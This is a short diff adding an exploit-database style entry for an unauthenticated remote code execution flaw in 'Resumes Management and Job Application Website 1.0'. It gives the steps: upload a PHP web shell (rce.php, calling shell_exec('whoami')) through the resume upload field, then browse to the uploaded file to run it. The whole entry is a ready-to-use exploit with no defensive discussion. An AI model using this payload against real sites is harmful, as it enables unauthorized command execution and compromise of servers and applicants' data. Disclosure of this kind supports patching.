@@ -1,0 +1,19 @@
+# Exploit Title: Resumes Management and Job Application Website 1.0 - RCE (Unauthenticated)
+# Date: 3/1/2021
+# Exploit Author: Arnav Tripathy
+# Vendor Homepage: https://egavilanmedia.com
+# Software Link: https://egavilanmedia.com/resumes-management-and-job-application-website/
+# Version: 1.0
+# Tested on: linux/lamp
+
+Submit rce.php in resume file upload unauthenticated.
+Contents of rce.php
+<?php
+$output = shell_exec('whoami');
+echo "<h1>$output</h1>";
+?>
+
+Navigate to http://localhost/Resumes Management and Job Application
+Website/files/rce.php
+
+You will get the output of whoami
